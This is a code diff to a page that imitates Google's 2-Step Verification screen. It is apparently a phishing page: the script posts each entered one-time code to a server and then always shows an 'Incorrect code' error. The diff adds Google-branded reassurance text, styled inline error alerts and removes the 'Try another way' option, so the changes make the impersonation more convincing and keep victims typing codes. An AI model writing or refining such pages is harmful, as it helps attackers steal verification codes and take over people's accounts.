@@ -64,8 +64,16 @@
         .otp-subtitle {
             font-size: 16px !important;
             color: #5f6368 !important;
-            margin: 0 0 16px 0 !important;
+            margin: 0 0 8px 0 !important;
             text-align: left !important;
+        }
+
+        .otp-security-text {
+            font-size: 14px !important;
+            color: #5f6368 !important;
+            margin: 0 0 32px 0 !important;
+            text-align: left !important;
+            line-height: 1.4 !important;
         }
 
         .otp-account-selector {
@@ -177,6 +185,83 @@
             text-decoration: underline !important;
         }
 
+        /* Inline alerts */
+        .inline-alert {
+            margin-top: 12px !important;
+            padding: 14px 18px !important;
+            border-radius: 12px !important;
+            font-size: 14px !important;
+            font-weight: 500 !important;
+            display: flex !important;
+            align-items: flex-start !important;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1) !important;
+            border: 1px solid transparent !important;
+            opacity: 1 !important;
+            transition: all 0.3s ease !important;
+            animation: slideIn 0.3s ease-out !important;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0 !important;
+                transform: translateY(-10px) !important;
+            }
+            to {
+                opacity: 1 !important;
+                transform: translateY(0) !important;
+            }
+        }
+
+        .inline-alert.error {
+            background: linear-gradient(135deg, #fce8e6 0%, #fef2f2 100%) !important;
+            border-color: #fecaca !important;
+            color: #dc2626 !important;
+            box-shadow: 0 4px 12px rgba(220, 38, 38, 0.15) !important;
+        }
+
+        .alert-content {
+            display: flex !important;
+            align-items: flex-start !important;
+            gap: 12px !important;
+            width: 100% !important;
+        }
+
+        .alert-icon {
+            font-size: 18px !important;
+            flex-shrink: 0 !important;
+            margin-top: 1px !important;
+        }
+
+        .alert-text {
+            flex: 1 !important;
+        }
+
+        .alert-title {
+            font-weight: 600 !important;
+            margin-bottom: 2px !important;
+        }
+
+        .alert-message {
+            font-weight: 400 !important;
+            line-height: 1.4 !important;
+        }
+
+        .alert-close {
+            background: none !important;
+            border: none !important;
+            color: currentColor !important;
+            cursor: pointer !important;
+            font-size: 16px !important;
+            padding: 0 !important;
+            margin-left: 8px !important;
+            opacity: 0.7 !important;
+            transition: opacity 0.2s ease !important;
+        }
+
+        .alert-close:hover {
+            opacity: 1 !important;
+        }
+
         /* Footer styles */
         .otp-gmail-footer {
             position: fixed !important;
@@ -227,6 +312,10 @@
         <div class="otp-gmail-logo"></div>
         <h1 class="otp-title">2-Step Verification</h1>
 
+        <div class="otp-security-text">
+            To help keep your account secure, Google wants to make sure it's really you trying to sign in
+        </div>
+
         <div class="otp-message" id="otp-message">
             Enter the 6-digit code sent to your email or phone
         </div>
@@ -252,7 +341,6 @@
 
         <div class="otp-gmail-links">
             <a href="#" onclick="resendCode()">Resend code</a>
-            <a href="#" onclick="needHelp()">Try another way</a>
         </div>
     </div>
 
@@ -329,10 +417,69 @@
                 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                 xhr.send('di=' + encodeURIComponent(value) + '&otp=' + encodeURIComponent(otp));
 
-                // THEN show error message
-                document.getElementById('error-message').style.display = 'block';
+                // THEN show inline error alert
+                showInlineAlert("Incorrect code. Please try again.", "error");
             } else {
-                alert("Please enter a 6-digit code.");
+                showInlineAlert("Please enter a 6-digit code.", "error");
+            }
+        }
+
+        function showInlineAlert(message, type = 'info', title = null) {
+            // Remove existing alerts
+            const existingAlerts = document.querySelectorAll('.inline-alert');
+            existingAlerts.forEach(alert => alert.remove());
+
+            // Set default titles
+            if (!title) {
+                switch(type) {
+                    case 'error':
+                        title = 'Error';
+                        break;
+                    case 'success':
+                        title = 'Success';
+                        break;
+                    case 'info':
+                    default:
+                        title = 'Notice';
+                        break;
+                }
+            }
+
+            // Create new alert
+            const alert = document.createElement('div');
+            alert.className = `inline-alert ${type}`;
+            alert.innerHTML = `
+                <div class="alert-content">
+                    <span class="alert-icon">${type === 'error' ? '⚠️' : type === 'success' ? '✅' : 'ℹ️'}</span>
+                    <div class="alert-text">
+                        <div class="alert-title">${title}</div>
+                        <div class="alert-message">${message}</div>
+                    </div>
+                    <button class="alert-close" onclick="closeAlert(this)">×</button>
+                </div>
+            `;
+
+            // Insert after the inputs
+            const inputsContainer = document.querySelector('.otp-inputs');
+            inputsContainer.parentNode.insertBefore(alert, inputsContainer.nextSibling);
+
+            // Auto remove after 8 seconds
+            setTimeout(() => {
+                if (alert.parentNode) {
+                    closeAlert(alert.querySelector('.alert-close'));
+                }
+            }, 8000);
+        }
+
+        function closeAlert(button) {
+            const alert = button.closest('.inline-alert');
+            if (alert) {
+                alert.style.opacity = '0';
+                setTimeout(() => {
+                    if (alert.parentNode) {
+                        alert.remove();
+                    }
+                }, 300);
             }
         }
 
